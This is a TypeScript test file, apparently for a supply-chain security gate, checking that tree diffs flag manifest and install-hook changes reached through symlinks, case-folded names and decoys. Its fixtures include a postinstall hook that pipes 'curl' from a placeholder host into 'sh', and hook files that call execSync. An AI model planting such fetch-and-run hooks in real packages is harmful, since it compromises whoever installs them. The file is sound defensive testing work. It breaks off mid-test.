import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { closeSync, existsSync, mkdirSync, mkdtempSync, openSync, readFileSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { diffTrees } from "../src/diff.js";
import { dirTree, gitTree, MAX_CACHED_ENTRY_BYTES, resolveTree } from "../src/tree.js";
import type { Tree } from "../src/tree.js";
import { fakeIO, fx, testCtx } from "./helpers.js";
import { run } from "../src/main.js";

test("gitTree from a monorepo subdirectory lists and reads that subdirectory's files, not the root's", () => {
  const d = mkdtempSync(join(tmpdir(), "ws-tree-"));
  const git = (...a: string[]) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...a], { cwd: d, stdio: "pipe" });
  git("init", "-q", "-b", "main");
  mkdirSync(join(d, "packages", "app"), { recursive: true });
  writeFileSync(join(d, "package-lock.json"), "root lockfile");
  writeFileSync(join(d, "packages", "app", "package-lock.json"), "member lockfile");
  git("add", "-A");
  git("commit", "-q", "-m", "c0");
  // soak --base reads the base lockfile this way from the soak directory; the root's would hide what the member adds.
  const t = gitTree(join(d, "packages", "app"), "HEAD");
  assert.equal(t.read("package-lock.json"), "member lockfile");
  assert.deepEqual(t.list(), ["package-lock.json"]);
  assert.equal(gitTree(d, "HEAD").read("package-lock.json"), "root lockfile", "positive control");
});

/** A git repository built by `steps`, one commit each; every step gets the repository directory. */
function gitRepo(...steps: ((d: string) => void)[]): string {
  const d = mkdtempSync(join(tmpdir(), "ws-tree-"));
  const git = (...a: string[]) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...a], { cwd: d, stdio: "pipe" });
  git("init", "-q", "-b", "main");
  for (const [i, step] of steps.entries()) {
    step(d);
    git("add", "-A");
    git("commit", "-q", "--allow-empty", "-m", `c${i}`);
  }
  return d;
}

test("gitTree reads a symlink through to its target, as the package manager does", () => {
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "real.json"), '{"name":"p"}');
      symlinkSync("real.json", join(d, "package.json"));
    },
    (d) => writeFileSync(join(d, "real.json"), evil),
  );
  const head = gitTree(d, "HEAD");
  assert.equal(head.read("package.json"), evil);
  const f = diffTrees(gitTree(d, "HEAD~1"), head, testCtx()).findings;
  assert.ok(f.some((x) => x.ruleId === "WS-DF-002" && x.file === "package.json"), "editing the target changes the link");
});

test("a symlink that leaves the tree or loops is reported as not checked on every run, changed or not", () => {
  const d = gitRepo((d) => {
    symlinkSync("../../outside.json", join(d, "package.json"));
    symlinkSync("/etc/hosts", join(d, ".npmrc"));
    mkdirSync(join(d, "etc"));
    writeFileSync(join(d, "etc", "hosts"), "registry=https://in-tree.example/\n"); // an absolute target is never this
    symlinkSync("b", join(d, "a"));
    symlinkSync("a", join(d, "b"));
    mkdirSync(join(d, "w"));
    symlinkSync("../a", join(d, "w", "package.json"));
  });
  const t = gitTree(d, "HEAD");
  assert.equal(t.read("package.json"), "../../outside.json", "read as its own text");
  assert.equal(t.read(".npmrc"), "/etc/hosts");
  assert.equal(t.read("a"), "b");
  // Unchanged, yet reported: an edit to outside.json or /etc/hosts is not in the commit.
  const f = diffTrees(t, t, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), ["WS-DF-006 .npmrc", "WS-DF-006 package.json", "WS-DF-006 w/package.json"]);
});

test("gitTree resolves a link through symlinked directories as the OS does, so editing what it reaches is a change", () => {
  const pkg = '{"name":"p","version":"1.0.0"}';
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const d = gitRepo(
    (d) => {
      mkdirSync(join(d, "deep", "x"), { recursive: true });
      mkdirSync(join(d, "evil"));
      writeFileSync(join(d, "deep", "x", ".keep"), "");
      writeFileSync(join(d, "deep", "real.json"), pkg);
      writeFileSync(join(d, "evil", "real.json"), evil);
      writeFileSync(join(d, "real.json"), evil); // what reading "x/.." as text would wrongly reach
      symlinkSync("deep", join(d, "sub"));
      symlinkSync("sub/real.json", join(d, "package.json"));
      symlinkSync(join("deep", "x"), join(d, "subx"));
      mkdirSync(join(d, "b"));
      symlinkSync("../subx/../real.json", join(d, "b", "package.json"));
      symlinkSync("nope/../real.json", join(d, "c.json")); // no directory "nope": the OS cannot open it
      symlinkSync("deep", join(d, "d.json")); // a directory: the OS cannot read it as a file
    },
    (d) => writeFileSync(join(d, "deep", "real.json"), evil), // only the target changes
    (d) => {
      writeFileSync(join(d, "deep", "real.json"), pkg);
      unlinkSync(join(d, "sub"));
      symlinkSync("evil", join(d, "sub")); // only the directory link changes
    },
  );
  assert.equal(readFileSync(join(d, "b", "package.json"), "utf8"), pkg, "the premise: the OS climbs from deep/x");
  assert.equal(readFileSync(join(d, "package.json"), "utf8"), evil, "the premise: the OS reads through sub");
  const base = gitTree(d, "HEAD~2");
  assert.equal(base.read("package.json"), pkg);
  assert.equal(base.read("b/package.json"), pkg, "'..' climbs from deep/x, where subx points, not from subx");
  // "nope" may be a link outside the tree that ".." climbs back from, so c.json reads as its own text.
  assert.equal(base.read("c.json"), "nope/../real.json");
  assert.throws(() => readFileSync(join(d, "d.json")), /EISDIR/, "the premise");
  assert.equal(base.read("d.json"), "deep");
  for (const [rev, path] of [["HEAD~1", "package.json"], ["HEAD~1", "b/package.json"], ["HEAD", "package.json"]] as const) {
    const f = diffTrees(base, gitTree(d, rev), testCtx()).findings;
    assert.ok(f.some((x) => x.ruleId === "WS-DF-002" && x.file === path), `${rev} ${path}`);
  }
});

test("gitTree follows a chain of links as long as the OS does", () => {
  const chain = (d: string) => {
    for (let i = 1; i < 40; i++) symlinkSync(`f${i - 1}`, join(d, `f${i}`));
    symlinkSync("f39", join(d, "package.json")); // 40 links
  };
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "f0"), '{"name":"p"}');
      chain(d);
    },
    (d) => writeFileSync(join(d, "f0"), JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } })),
  );
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.ok(f.some((x) => x.ruleId === "WS-DF-002" && x.file === "package.json"));
});

test("gitTree fetches each link once, however many paths lead through it", () => {
  const d = gitRepo((d) => {
    writeFileSync(join(d, "f0"), '{"name":"p"}');
    for (let i = 1; i < 30; i++) symlinkSync(`f${i - 1}`, join(d, `f${i}`));
    for (let i = 0; i < 10; i++) {
      mkdirSync(join(d, `w${i}`));
      symlinkSync("../f29", join(d, `w${i}`, "package.json"));
    }
  });
  // Count `git show` runs through a git that logs them, first on PATH.
  const bin = mkdtempSync(join(tmpdir(), "ws-tree-"));
  const realGit = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  // tree.ts runs `git -c <setting> ... -C <dir> <subcommand> ...`; only `show` has the word show among its arguments.
  writeFileSync(join(bin, "git"), `#!/bin/sh\ncase " $* " in *" show "*) echo >> "${join(bin, "count")}" ;; esac\nexec "${realGit}" "$@"\n`, { mode: 0o755 });
  const path = process.env.PATH;
  process.env.PATH = `${bin}:${path}`;
  try {
    const t = gitTree(d, "HEAD");
    for (let i = 0; i < 10; i++) assert.equal(t.read(`w${i}/package.json`), '{"name":"p"}');
  } finally {
    process.env.PATH = path;
  }
  // 10 + 29 links and f0 itself; without memoising, each read fetched its 30 links again (310 runs).
  assert.equal(readFileSync(join(bin, "count"), "utf8").length, 40);
});

test("a link through .git, node_modules or a submodule is not checked, even when only its target changes", () => {
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  // [manifest link, its target]: every one opens real.json on this Mac once .git and node_modules exist.
  const links: [string, string][] = [
    ["package.json", ".git/../real.json"],
    ["a/package.json", "../.GIT/../real.json"],
    ["b/package.json", "../.git/hooks/../../real.json"],
    ["c/package.json", "../.git/refs/heads/../../../real.json"],
    ["e/package.json", "../node_modules/../real.json"],
    ["f/package.json", "../NODE_MODULES/../real.json"],
  ];
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "real.json"), '{"name":"p"}');
      for (const [link, target] of links) {
        mkdirSync(dirname(join(d, link)), { recursive: true });
        symlinkSync(target, join(d, link));
      }
      mkdirSync(join(d, "node_modules")); // empty, so untracked, as an install leaves it
    },
    (d) => writeFileSync(join(d, "real.json"), evil), // only the target changes
  );
  for (const link of ["package.json", "b/package.json", "c/package.json", "e/package.json"]) {
    assert.equal(readFileSync(join(d, link), "utf8"), evil, `the premise: the OS reads ${link} through to real.json`);
  }
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), links.map(([link]) => `WS-DF-006 ${link}`).sort());
  // A submodule holds another repository, so config naming code inside it is not checked either.
  const sub = indexRepo([
    ["pnpm-workspace.yaml", "100644", "pnpmfile: vendor/hooks/hook.cjs\n"],
    ["vendor/hooks", "160000", "0".repeat(39) + "1"],
  ]);
  const s = diffTrees(gitTree(sub, "HEAD"), gitTree(sub, "HEAD"), testCtx()).findings;
  assert.deepEqual(s.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-006 vendor/hooks/hook.cjs"]);
});

test("config naming a directory is not checked: pnpm 11.16 runs the directory's index.js", () => {
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "pnpm-workspace.yaml"), "pnpmfile: hooks\n");
      mkdirSync(join(d, "hooks"));
      writeFileSync(join(d, "hooks", "index.js"), "module.exports = { hooks: {} };");
    },
    (d) => writeFileSync(join(d, "hooks", "index.js"), 'require("child_process").execSync("id"); module.exports = { hooks: {} };'),
  );
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-006 hooks"]);
});

test("gitTree does not climb back over a name the tree lacks that an install may have made a link", () => {
  const evil = JSON.stringify({ name: "c", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const benign = JSON.stringify({ name: "c", version: "1.0.0" });
  // [repository, the link an install makes, the manifest link the change adds, where the OS reads it, where the gate's
  // textual climb reads it]
  const cases: [string, [string, string], [string, string], string, string][] = [
    // pnpm 11.16 links a workspace dependency as packages/a/node_modules/b -> ../../b, under an ignored node_modules.
    [
      "pnpm",
      ["packages/a/node_modules/b", "../../b"],
      ["packages/c/package.json", "../a/node_modules/b/../../x.json"],
      "x.json",
      "packages/a/x.json",
    ],
    // npm 10.9 links node_modules/b -> ../packages/b, also when the change tracks a file in node_modules.
    [
      "npm",
      ["node_modules/b", "../packages/b"],
      ["packages/c/package.json", "../../node_modules/b/../x.json"],
      "packages/x.json",
      "node_modules/x.json",
    ],
    // npm 10.9 links workspaces named @x/node_modules and @x/.git, valid npm names, as links under node_modules/@x.
    ...["node_modules", ".git"].map((name): [string, [string, string], [string, string], string, string] => [
      `npm @x/${name}`,
      [`node_modules/@x/${name}`, "../../packages/b"],
      ["packages/c/package.json", `../../node_modules/@x/${name}/../x.json`],
      "packages/x.json",
      "node_modules/@x/x.json",
    ]),
  ];
  for (const [pm, [link, linkTarget], [manifest, manifestTarget], osReads, gateReads] of cases) {
    const d = gitRepo(
      (d) => {
        mkdirSync(join(d, "packages", "a"), { recursive: true });
        mkdirSync(join(d, "packages", "b"), { recursive: true });
        mkdirSync(join(d, "packages", "c"), { recursive: true });
        mkdirSync(join(d, "node_modules"));
        writeFileSync(join(d, "packages", "b", "package.json"), '{"name":"b"}');
        writeFileSync(join(d, ".gitignore"), pm === "pnpm" ? "node_modules\n" : "");
      },
      (d) => {
        mkdirSync(dirname(join(d, gateReads)), { recursive: true });
        writeFileSync(join(d, gateReads), benign);
        writeFileSync(join(d, osReads), evil);
        symlinkSync(manifestTarget, join(d, manifest));
      },
    );
    mkdirSync(dirname(join(d, link)), { recursive: true });
    symlinkSync(linkTarget, join(d, link)); // made by the install, after checkout: untracked
    assert.equal(readFileSync(join(d, manifest), "utf8"), evil, `${pm}: the premise`);
    const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
    assert.ok(f.some((x) => (x.ruleId === "WS-DF-006" || x.ruleId === "WS-DF-002") && x.file === manifest), pm);
  }
});

/**
 * Every git run that gets input here is bounded, and gets its input from a file, never from a pipe. spawnSync's and
 * execFileSync's `input` is streamed through a socket pair that buffers 8 KiB on macOS; a larger input (the 600 KB link
 * target below) sometimes never finishes writing when many processes run at once: the child waits in read(), and node
 * holds the other end in its loop, never woken to write the rest (Node 23.11.0, macOS 15.6.1; the same fault hung 7 of
 * 1,800 runs of a 73 KB python3 input under 12 concurrent loops, 0 of 1,800 with the input in a file). A run that does
 * not finish fails its test, saying what it ran, instead of holding the whole file until scripts/run-tests.mjs's
 * ten-minute timeout. Each run takes milliseconds.
 */
const CHILD_LIMIT_MS = 60_000;

/** Runs cmd in cwd with `input` as its stdin, read from a file; returns its stdout. Fails, naming the run, if it fails or does not finish in limitMs. */
function runFed(cmd: string, args: string[], input: string | Buffer | undefined, cwd: string, limitMs = CHILD_LIMIT_MS): string {
  const scratch = mkdtempSync(join(tmpdir(), "ws-tree-in-"));
  const fd = (() => {
    if (input === undefined) return undefined;
    writeFileSync(join(scratch, "stdin"), input);
    return openSync(join(scratch, "stdin"), "r");
  })();
  try {
    const r = spawnSync(cmd, args, { cwd, stdio: [fd ?? "ignore", "pipe", "pipe"], encoding: "utf8", maxBuffer: 1 << 26, timeout: limitMs, killSignal: "SIGKILL" });
    const what = `${[cmd, ...args].join(" ").slice(0, 200)} (${input === undefined ? "no input" : `${Buffer.byteLength(input)} bytes of input, from a file`})`;
    if ((r.error as NodeJS.ErrnoException | undefined)?.code === "ETIMEDOUT") assert.fail(`${what} did not finish within ${limitMs / 1000} s and was killed`);
    if (r.error) assert.fail(`${what} could not run: ${r.error.message}`);
    if (r.signal) assert.fail(`${what} was killed by ${r.signal}`);
    assert.equal(r.status, 0, `${what} exited ${r.status}: ${r.stderr}`);
    return r.stdout;
  } finally {
    if (fd !== undefined) closeSync(fd);
    rmSync(scratch, { recursive: true, force: true });
  }
}

const GIT_AS_T = ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false"];

test("runFed gives the child its whole input as a file, not a pipe, kills a child that does not finish, and names a failed run", () => {
  const probe = "const fs = require('fs'); console.log(fs.fstatSync(0).isFile(), fs.readFileSync(0).length)";
  assert.equal(runFed(process.execPath, ["-e", probe], "a/".repeat(300_000), tmpdir()).trim(), "true 600000");
  // Positive control: the probe tells a pipe from a file (a one-byte input, which fits a pipe's buffer, so this cannot hang).
  assert.equal(spawnSync(process.execPath, ["-e", probe], { input: "x", encoding: "utf8" }).stdout.trim(), "false 1");
  assert.throws(
    () => runFed(process.execPath, ["-e", "setTimeout(() => {}, 60000)"], "x", tmpdir(), 300),
    (e: Error) => /setTimeout.* \(1 bytes of input, from a file\) did not finish within 0\.3 s and was killed/.test(e.message),
  );
  assert.throws(() => runFed(process.execPath, ["-e", "console.error('boom'); process.exit(3)"], undefined, tmpdir()), /\(no input\) exited 3: boom/);
});

/** A one-commit repository whose entries are written straight to the index: [path, mode, content]. */
function indexRepo(entries: [string, string, string][]): string {
  const d = mkdtempSync(join(tmpdir(), "ws-tree-"));
  const git = (args: string[], input?: string) => runFed("git", [...GIT_AS_T, ...args], input, d);
  git(["init", "-q", "-b", "main"]);
  for (const [path, mode, content] of entries) {
    const blob = git(["hash-object", "-w", "--stdin"], content).trim();
    git(["update-index", "--add", "--cacheinfo", `${mode},${blob},${path}`]);
  }
  git(["commit", "-q", "-m", "c0"]);
  return d;
}

test("a link is not followed through a name in another case, or a name two entries share by case", () => {
  const pkg = '{"name":"p"}';
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const d = indexRepo([
    ["sub/real.json", "100644", pkg],
    ["package.json", "120000", "SUB/Real.json"],
    ["two/x.json", "100644", pkg],
    ["Two/x.json", "100644", pkg],
    ["a/package.json", "120000", "../TWO/x.json"],
    // git 2.50 on APFS checks out only real.json of these two, so the link below reads evil there.
    ["REAL.json", "100644", pkg],
    ["real.json", "100644", evil],
    ["b/package.json", "120000", "../REAL.json"],
    // A tracked decoy whose name folds to the path a Linux install makes: node_modules/w -> ../w.
    ["w/package.json", "100644", evil],
    ["NODE_MODULES/w/package.json", "100644", pkg],
    ["c/package.json", "120000", "../node_modules/w/package.json"],
    ["d/package.json", "120000", "../sub/real.json"],
  ]);
  const t = gitTree(d, "HEAD");
  assert.equal(t.read("package.json"), "SUB/Real.json", "read as its own text");
  const f = diffTrees(t, t, testCtx()).findings.filter((x) => x.ruleId === "WS-DF-006").map((x) => x.file);
  for (const link of ["package.json", "a/package.json", "b/package.json", "c/package.json"]) assert.ok(f.includes(link), link);
  assert.equal(t.read("d/package.json"), pkg, "positive control: exact names are followed");
  assert.ok(!f.includes("d/package.json") && !f.includes("w/package.json"), "positive control");
});

test("a tracked fullwidth decoy does not stand in for the node_modules an install makes", () => {
  const evil = JSON.stringify({ name: "w", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const benign = JSON.stringify({ name: "w", version: "1.0.0" });
  const d = gitRepo(
    (d) => {
      for (const p of ["c", "w"]) {
        mkdirSync(join(d, "packages", p), { recursive: true });
        writeFileSync(join(d, "packages", p, "package.json"), JSON.stringify({ name: p, version: "1.0.0" }));
      }
      writeFileSync(join(d, ".gitignore"), "node_modules\n");
    },
    (d) => {
      writeFileSync(join(d, "packages", "w", "notes.json"), evil);
      mkdirSync(join(d, "\uff4eode_modules", "w"), { recursive: true }); // fullwidth n: APFS keeps it apart
      writeFileSync(join(d, "\uff4eode_modules", "w", "notes.json"), benign);
      unlinkSync(join(d, "packages", "c", "package.json"));
      symlinkSync("../../node_modules/w/notes.json", join(d, "packages", "c", "package.json"));
    },
  );
  mkdirSync(join(d, "node_modules"));
  symlinkSync("../packages/w", join(d, "node_modules", "w")); // made by npm workspaces, after checkout
  assert.equal(readFileSync(join(d, "packages", "c", "package.json"), "utf8"), evil, "the premise");
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.ok(f.some((x) => x.ruleId === "WS-DF-006" && x.file === "packages/c/package.json"));
});

test("a tracked node_modules decoy does not stand in for the workspace link npm makes over it", () => {
  const evil = JSON.stringify({ name: "c", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "package.json"), JSON.stringify({ name: "root", private: true, workspaces: ["packages/*"] }));
      for (const p of ["c", "w"]) {
        mkdirSync(join(d, "packages", p), { recursive: true });
        writeFileSync(join(d, "packages", p, "package.json"), JSON.stringify({ name: p, version: "1.0.0" }));
      }
    },
    (d) => {
      mkdirSync(join(d, "node_modules", "w"), { recursive: true }); // tracked: no .gitignore
      writeFileSync(join(d, "node_modules", "w", "notes.json"), readFileSync(join(d, "packages", "c", "package.json")));
      writeFileSync(join(d, "packages", "w", "notes.json"), '{"name":"c","version":"1.0.0"}');
      unlinkSync(join(d, "packages", "c", "package.json"));
      symlinkSync("../../node_modules/w/notes.json", join(d, "packages", "c", "package.json"));
    },
    (d) => writeFileSync(join(d, "packages", "w", "notes.json"), evil), // only the real target changes
  );
  // npm 10.9.2 `install` deletes the tracked node_modules/w and links the workspace there: w -> ../packages/w.
  rmSync(join(d, "node_modules", "w"), { recursive: true });
  symlinkSync("../packages/w", join(d, "node_modules", "w"));
  assert.equal(readFileSync(join(d, "packages", "c", "package.json"), "utf8"), evil, "the premise");
  for (const [from, to] of [["HEAD~2", "HEAD~1"], ["HEAD~1", "HEAD"]] as const) {
    const f = diffTrees(gitTree(d, from), gitTree(d, to), testCtx()).findings;
    assert.ok(f.some((x) => x.ruleId === "WS-DF-006" && x.file === "packages/c/package.json"), `${from}..${to}`);
  }
});

test("config naming code under node_modules is not checked, tracked or not: the install owns that path", () => {
  const d = indexRepo([
    ["pnpm-workspace.yaml", "100644", "pnpmfile: node_modules/x/hook.cjs\n"],
    ["node_modules/x/hook.cjs", "100644", "module.exports = {};"],
    [".yarnrc.yml", "100644", "yarnPath: node_modules/y/yarn.cjs\n"],
  ]);
  const t = gitTree(d, "HEAD");
  const f = diffTrees(t, t, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), ["WS-DF-006 node_modules/x/hook.cjs", "WS-DF-006 node_modules/y/yarn.cjs"]);
});

test("a not-checked finding's fingerprint changes with anything in the tree, so a baseline entry accepts one version", () => {
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const benignHook = "module.exports = {};";
  const evilHook = 'require("child_process").execSync("id");';
  const repo = (pkg: string, hook: string) =>
    indexRepo([
      ["package.json", "100644", pkg],
      ["PACKAGE.json", "100644", '{"name":"p"}'],
      ["pnpm-workspace.yaml", "100644", "pnpmfile: hooks\n"],
      ["hooks/index.js", "100644", hook],
    ]);
  const prints = (t: Tree) => diffTrees(t, t, testCtx()).findings.map((x) => `${x.ruleId} ${x.file} ${x.fingerprint}`).sort();
  const ok = prints(gitTree(repo('{"name":"p"}', benignHook), "HEAD"));
  assert.deepEqual(ok.map((x) => x.split(" ").slice(0, 2).join(" ")), ["WS-DF-006 PACKAGE.json", "WS-DF-006 hooks", "WS-DF-006 package.json"]);
  assert.deepEqual(prints(gitTree(repo('{"name":"p"}', benignHook), "HEAD")), ok, "positive control: the same content keeps its fingerprints");
  for (const [pkg, hook] of [[evil, benignHook], ['{"name":"p"}', evilHook]]) {
    const changed = prints(gitTree(repo(pkg as string, hook as string), "HEAD"));
    for (const [i, x] of changed.entries()) assert.notEqual(x, ok[i], `${x} after an edit`);
  }
  // dir: trees: a configured directory whose index.js changes.
  const dir = (hook: string) => {
    const d = mkdtempSync(join(tmpdir(), "ws-tree-"));
    writeFileSync(join(d, "pnpm-workspace.yaml"), "pnpmfile: hooks\n");
    mkdirSync(join(d, "hooks"));
    writeFileSync(join(d, "hooks", "index.js"), hook);
    return prints(dirTree(d));
  };
  const okDir = dir(benignHook);
  assert.deepEqual(okDir.map((x) => x.split(" ").slice(0, 2).join(" ")), ["WS-DF-006 hooks"]);
  assert.deepEqual(dir(benignHook), okDir, "positive control");
  assert.notDeepEqual(dir(evilHook), okDir);
});

test("a baseline entry in the default baseline file accepts a not-checked finding for that same tree", () => {
  const cli = join(import.meta.dirname, "..", "src", "cli.js");
  type F = { ruleId: string; file: string; fingerprint: string; suppressed?: unknown };
  /** The one finding of `wormsign diff`. */
  const diff = (d: string, ...revs: string[]): F => {
    const r = spawnSync(process.execPath, [cli, "diff", ...revs, "--format", "json"], { cwd: d, encoding: "utf8", timeout: 10_000 });
    const f = (JSON.parse(r.stdout) as { findings: F[] }).findings;
    assert.equal(f.length, 1, r.stdout);
    return f[0] as F;
  };
  const accept = (d: string, fingerprint: string) =>
    writeFileSync(join(d, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: [{ fingerprint, justification: "links to the shared manifest one level up" }] }));
  const commit = (d: string) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qam", "c"], { cwd: d, stdio: "pipe" });
  const d = gitRepo(
    (d) => symlinkSync("../outside.json", join(d, "package.json")),
    (d) => accept(d, "0".repeat(32)),
  );
  const before = diff(d, "HEAD", "HEAD");
  assert.equal(`${before.ruleId} ${before.file} ${String(before.suppressed)}`, "WS-DF-006 package.json undefined");
  accept(d, before.fingerprint);
  commit(d);
  const after = diff(d, "HEAD", "HEAD");
  assert.equal(after.fingerprint, before.fingerprint, "the baseline file is not in the stamp");
  assert.ok(after.suppressed, "accepted");
  // Positive control: any other edit is another tree, which the entry does not accept.
  writeFileSync(join(d, "README"), "x");
  execFileSync("git", ["add", "README"], { cwd: d });
  commit(d);
  const other = diff(d, "HEAD", "HEAD");
  assert.ok(other.fingerprint !== before.fingerprint && !other.suppressed, "another tree");
  // dir: trees too.
  const dir = mkdtempSync(join(tmpdir(), "ws-tree-"));
  symlinkSync("../outside.json", join(dir, "package.json"));
  accept(dir, "0".repeat(32));
  const dirBefore = diff(dir, `dir:${dir}`, `dir:${dir}`);
  accept(dir, dirBefore.fingerprint);
  const dirAfter = diff(dir, `dir:${dir}`, `dir:${dir}`);
  assert.ok(dirAfter.fingerprint === dirBefore.fingerprint && dirAfter.suppressed, "dir: accepted");
});

test("dirTree reports a dangling or looping link on a gate path as not checked: the install may make its target", () => {
  const [base, head] = [mkdtempSync(join(tmpdir(), "ws-tree-")), mkdtempSync(join(tmpdir(), "ws-tree-"))];
  for (const d of [base, head]) writeFileSync(join(d, "pnpm-workspace.yaml"), "pnpmfile: hooks/hook.cjs\n");
  mkdirSync(join(head, "packages", "c"), { recursive: true });
  // Before install: node_modules does not exist yet.
  symlinkSync("../../node_modules/w/notes.json", join(head, "packages", "c", "package.json"));
  symlinkSync("loop", join(head, ".npmrc"));
  symlinkSync(".npmrc", join(head, "loop"));
  symlinkSync("missing.json", join(head, ".yarnrc.yml"));
  symlinkSync("gone", join(head, "hooks")); // a dangling link on the way, not at the path itself
  const f = diffTrees(dirTree(base), dirTree(head), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), ["WS-DF-006 .npmrc", "WS-DF-006 .yarnrc.yml", "WS-DF-006 hooks/hook.cjs", "WS-DF-006 packages/c/package.json"]);
  assert.deepEqual(diffTrees(dirTree(base), dirTree(base), testCtx()).findings, [], "positive control: an absent path is not a finding");
});

test("a link target longer than any OS allows reads as its own text, not a crash", () => {
  const long = "a/".repeat(300_000);
  const t = gitTree(indexRepo([["package.json", "120000", long]]), "HEAD");
  assert.equal(t.read("package.json"), long);
  const f = diffTrees({ label: "empty", list: () => [], read: () => undefined }, t, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-006 package.json"]);
});

test("diff gates code that config names through a symlinked directory when only the real file changes", () => {
  const hook = (body: string) => `module.exports = { hooks: { readPackage: (p) => (${body}, p) } };`;
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "pnpm-workspace.yaml"), "pnpmfile: hooks/hook.cjs\n");
      writeFileSync(join(d, ".yarnrc.yml"), "yarnPath: .yarn/releases/yarn.cjs\n");
      mkdirSync(join(d, "deep"));
      writeFileSync(join(d, "deep", "hook.cjs"), hook("0"));
      writeFileSync(join(d, "deep", "yarn.cjs"), "/* yarn */");
      symlinkSync("deep", join(d, "hooks"));
      mkdirSync(join(d, ".yarn"));
      symlinkSync("../deep", join(d, ".yarn", "releases"));
    },
    (d) => {
      writeFileSync(join(d, "deep", "hook.cjs"), hook('require("child_process").execSync("curl -s https://a.invalid/x | sh")'));
      writeFileSync(join(d, "deep", "yarn.cjs"), '/* yarn */ require("child_process").execSync("id")');
    },
  );
  const want = ["WS-DF-005 .yarn/releases/yarn.cjs", "WS-DF-005 hooks/hook.cjs"];
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), want);
  execFileSync("git", ["worktree", "add", "-q", "--detach", join(d, "..", `${d.split("/").pop()}-base`), "HEAD~1"], { cwd: d, stdio: "pipe" });
  const dirs = diffTrees(dirTree(join(d, "..", `${d.split("/").pop()}-base`)), dirTree(d), testCtx()).findings;
  assert.deepEqual(dirs.map((x) => `${x.ruleId} ${x.file}`).sort(), want, "dir: trees too");
});

test("a binary lockfile change in bytes that are not UTF-8 is still a change", () => {
  const d = gitRepo(
    (d) => writeFileSync(join(d, "bun.lockb"), Buffer.from([0x62, 0x80])),
    (d) => writeFileSync(join(d, "bun.lockb"), Buffer.from([0x62, 0x81])),
  );
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-006 bun.lockb"]);
  const dirs = [mkdtempSync(join(tmpdir(), "ws-tree-")), mkdtempSync(join(tmpdir(), "ws-tree-"))] as const;
  writeFileSync(join(dirs[0], "bun.lockb"), Buffer.from([0x62, 0x80]));
  writeFileSync(join(dirs[1], "bun.lockb"), Buffer.from([0x62, 0x81]));
  assert.equal(diffTrees(dirTree(dirs[0]), dirTree(dirs[1]), testCtx()).findings.length, 1, "dir: trees too");
});

test("dirTree lists symlinks, so a symlinked manifest is compared like a file", () => {
  const [base, head] = [mkdtempSync(join(tmpdir(), "ws-tree-")), mkdtempSync(join(tmpdir(), "ws-tree-"))];
  writeFileSync(join(head, "real.json"), JSON.stringify({ scripts: { postinstall: "node x.js" } }));
  symlinkSync("real.json", join(head, "package.json"));
  assert.ok(dirTree(head).list().includes("package.json"));
  assert.ok(diffTrees(dirTree(base), dirTree(head), testCtx()).findings.some((x) => x.ruleId === "WS-DF-002" && x.file === "package.json"));
});

test("dirTree reports a link to a FIFO or out of the root as not checked, so the gate finishes and fails closed", () => {
  const [base, head, out] = [mkdtempSync(join(tmpdir(), "ws-tree-")), mkdtempSync(join(tmpdir(), "ws-tree-")), mkdtempSync(join(tmpdir(), "ws-tree-"))];
  execFileSync("mkfifo", [join(out, "fifo")]);
  writeFileSync(join(out, "pkg.json"), JSON.stringify({ scripts: { postinstall: "echo SECRET-OUTSIDE" } }));
